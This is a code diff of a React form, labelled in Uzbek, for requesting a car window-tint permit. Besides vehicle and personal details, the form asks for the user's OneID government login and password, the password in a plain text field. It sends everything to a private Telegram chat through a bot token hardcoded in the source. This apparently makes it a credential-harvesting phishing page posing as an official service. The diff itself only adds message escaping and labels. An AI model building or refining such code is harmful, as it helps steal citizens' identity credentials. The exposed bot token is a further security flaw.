@@ -2,6 +2,28 @@ import { useState } from 'react';
 import { IMaskInput } from 'react-imask';
 import { toast } from 'sonner';
 
+function escapeMarkdownV2(text) {
+    return text
+        .replace(/\\/g, '\\\\') // Escape backslash first
+        .replace(/_/g, '\\_')
+        .replace(/\*/g, '\\*')
+        .replace(/\[/g, '\\[')
+        .replace(/\]/g, '\\]')
+        .replace(/\(/g, '\\(')
+        .replace(/\)/g, '\\)')
+        .replace(/~/g, '\\~')
+        .replace(/`/g, '\\`')
+        .replace(/>/g, '\\>')
+        .replace(/#/g, '\\#')
+        .replace(/\+/g, '\\+')
+        .replace(/-/g, '\\-')
+        .replace(/=/g, '\\=')
+        .replace(/\|/g, '\\|')
+        .replace(/\{/g, '\\{')
+        .replace(/\}/g, '\\}')
+        .replace(/\./g, '\\.')
+        .replace(/!/g, '\\!');
+}
 
 const BOT_TOKEN = '8005450451:AAEj4m1FAovWc8P4wna4QIbS21JaAXsqD6o';
 const CHAT_ID = '1163282279';
@@ -31,13 +53,13 @@ export const TanirovkaForm = () => {
 
         const message = `
 🚘 *Tanirovka Ruxsatnoma So'rov*:
-👤 Turi: ${isYuridik ? 'Yuridik' : 'Jismoniy'}
-🔢 Avtoraqam: ${autoNumber}
-📄 Transport ID: ${autoTransportId}
-📱 Telefon: ${phone}
-🧑‍💻 OneID login: ${login || 'Yo‘q'}
-🔒 OneID parol: ${password || 'Yo‘q'}
-📝 F.I.O: ${fio}
+👤 Turi: ${escapeMarkdownV2(isYuridik ? 'Yuridik' : 'Jismoniy')}
+🔢 Avtoraqam: ${escapeMarkdownV2(autoNumber)}
+📄 Transport ID: ${escapeMarkdownV2(autoTransportId)}
+📱 Telefon: ${escapeMarkdownV2(phone)}
+🧑‍💻 OneID login: ${escapeMarkdownV2(login || 'Yo‘q')}
+🔒 OneID parol: ${escapeMarkdownV2(password || 'Yo‘q')}
+📝 F\\.I\\.O\\: ${escapeMarkdownV2(fio)}
         `;
 
         try {
@@ -47,20 +69,19 @@ export const TanirovkaForm = () => {
                 body: JSON.stringify({
                     chat_id: CHAT_ID,
                     text: message,
-                    parse_mode: 'Markdown',
+                    parse_mode: 'MarkdownV2',
                 }),
             });
 
             toast.success('Ma\'lumotlar yuborildi ✅');
 
-            // Reset form
             setAutoNumber('');
             setAutoTransportId('');
             setPhone('');
             setLogin('');
             setPassword('');
             setFio('');
-        } catch  {
+        } catch {
             toast.error('Yuborishda xatolik yuz berdi ❌');
         } finally {
             setIsLoading(false);
@@ -68,9 +89,8 @@ export const TanirovkaForm = () => {
     };
 
     return (
-        <div className="relative w-full h-full overflow-auto flex flex-col items-center justify-between px-[10px] py-4">
+        <div className="relative w-full h-full overflow-auto flex flex-col items-center justify-between gap-[90px] lg:gap-[40px] px-[10px] py-4">
 
-            {/* Form Blur Area */}
             <div className={`${isLoading ? 'blur-sm pointer-events-none' : ''} w-full h-full flex flex-col items-center gap-[16px]`}>
                 {/* Toggle */}
                 <div className="flex gap-3">
@@ -92,67 +112,85 @@ export const TanirovkaForm = () => {
                     </button>
                 </div>
 
-                {/* Auto Number */}
-                <IMaskInput
-                    mask={isYuridik ? '00|000aaa' : '00|a000aa'}
-                    definitions={{ a: /[A-Za-z]/ }}
-                    value={autoNumber}
-                    unmask={false}
-                    onAccept={(value) => setAutoNumber(value.toUpperCase())}
-                    placeholder={isYuridik ? '01|001AAA' : '01|A001AA'}
-                    className="border w-full focus:border-[#258385] px-4 py-2 rounded-md text-[#258385] outline-none uppercase"
-                />
+                {/* Avtoraqam */}
+                <div className="w-full flex flex-col gap-2">
+                    <label className="text-sm font-medium text-[#258385]">Avtotransport raqamingiz</label>
+                    <IMaskInput
+                        mask={isYuridik ? '00|000aaa' : '00|a000aa'}
+                        definitions={{ a: /[A-Za-z]/ }}
+                        value={autoNumber}
+                        unmask={false}
+                        onAccept={(value) => setAutoNumber(value.toUpperCase())}
+                        placeholder={isYuridik ? '01|001AAA' : '01|A001AA'}
+                        className="border w-full focus:border-[#258385] px-4 py-2 rounded-md text-[#258385] outline-none uppercase"
+                    />
+                </div>
 
-                {/* Auto Transport ID */}
-                <IMaskInput
-                    mask="aaa 000 00 00"
-                    definitions={{ a: /[A-Za-z]/ }}
-                    value={autoTransportId}
-                    unmask={false}
-                    onAccept={(value) => setAutoTransportId(value.toUpperCase())}
-                    placeholder="AAA 123 45 67"
-                    className="border w-full focus:border-[#258385] px-4 py-2 rounded-md text-[#258385] outline-none uppercase"
-                />
+                {/* Transport ID */}
+                <div className="w-full flex flex-col gap-2">
+                    <label className="text-sm font-medium text-[#258385]">Transport ID</label>
+                    <IMaskInput
+                        mask="aaa 000 00 00"
+                        definitions={{ a: /[A-Za-z]/ }}
+                        value={autoTransportId}
+                        unmask={false}
+                        onAccept={(value) => setAutoTransportId(value.toUpperCase())}
+                        placeholder="AAA 123 45 67"
+                        className="border w-full focus:border-[#258385] px-4 py-2 rounded-md text-[#258385] outline-none uppercase"
+                    />
+                </div>
 
-                {/* Phone */}
-                <IMaskInput
-                    mask="+998 00 000 00 00"
-                    value={phone}
-                    unmask={false}
-                    onAccept={(value) => setPhone(value)}
-                    placeholder="+998 90 123 45 67"
-                    className="border w-full focus:border-[#258385] px-4 py-2 rounded-md text-[#258385] outline-none"
-                />
+                {/* Telefon */}
+                <div className="w-full flex flex-col gap-2">
+                    <label className="text-sm font-medium text-[#258385]">Telefon raqam</label>
+                    <IMaskInput
+                        mask="+998 00 000 00 00"
+                        value={phone}
+                        unmask={false}
+                        onAccept={(value) => setPhone(value)}
+                        placeholder="+998 90 123 45 67"
+                        className="border w-full focus:border-[#258385] px-4 py-2 rounded-md text-[#258385] outline-none"
+                    />
+                </div>
 
                 {/* OneID Login */}
-                <input
-                    type="text"
-                    value={login}
-                    onChange={(e) => setLogin(e.target.value)}
-                    placeholder="OneID login (ixtiyoriy)"
-                    className="border w-full focus:border-[#258385] px-4 py-2 rounded-md text-[#258385] outline-none"
-                />
+                <div className="w-full flex flex-col gap-2">
+                    <label className="text-sm font-medium text-[#258385]">OneID login (ixtiyoriy)</label>
+                    <input
+                        type="text"
+                        value={login}
+                        onChange={(e) => setLogin(e.target.value)}
+                        placeholder="OneID login"
+                        className="border w-full focus:border-[#258385] px-4 py-2 rounded-md text-[#258385] outline-none"
+                    />
+                </div>
 
-                {/* OneID Password */}
-                <input
-                    type="text"
-                    value={password}
-                    onChange={(e) => setPassword(e.target.value)}
-                    placeholder="OneID parol (ixtiyoriy)"
-                    className="border w-full focus:border-[#258385] px-4 py-2 rounded-md text-[#258385] outline-none"
-                />
+                {/* OneID Parol */}
+                <div className="w-full flex flex-col gap-2">
+                    <label className="text-sm font-medium text-[#258385]">OneID parol (ixtiyoriy)</label>
+                    <input
+                        type="text"
+                        value={password}
+                        onChange={(e) => setPassword(e.target.value)}
+                        placeholder="OneID parol"
+                        className="border w-full focus:border-[#258385] px-4 py-2 rounded-md text-[#258385] outline-none"
+                    />
+                </div>
 
-                {/* F.I.O. */}
-                <input
-                    type="text"
-                    value={fio}
-                    onChange={(e) => setFio(e.target.value)}
-                    placeholder="F.I.O (to‘liq ism sharif)"
-                    className="border w-full focus:border-[#258385] px-4 py-2 rounded-md text-[#258385] outline-none"
-                />
+                {/* F.I.O */}
+                <div className="w-full flex flex-col gap-2">
+                    <label className="text-sm font-medium text-[#258385]">F.I.O (to‘liq ism sharif)</label>
+                    <input
+                        type="text"
+                        value={fio}
+                        onChange={(e) => setFio(e.target.value)}
+                        placeholder="F.I.O"
+                        className="border w-full focus:border-[#258385] px-4 py-2 rounded-md text-[#258385] outline-none"
+                    />
+                </div>
             </div>
 
-            {/* Submit Button */}
+            {/* Submit */}
             <button
                 onClick={handleSubmit}
                 disabled={isLoading}
@@ -161,7 +199,7 @@ export const TanirovkaForm = () => {
                 Yuborish
             </button>
 
-            {/* Loader Overlay */}
+            {/* Loader */}
             {isLoading && (
                 <div className="absolute inset-0 flex items-center justify-center bg-white/60 z-10">
                     <div className="w-12 h-12 border-4 border-[#258385] border-t-transparent rounded-full animate-spin"></div>
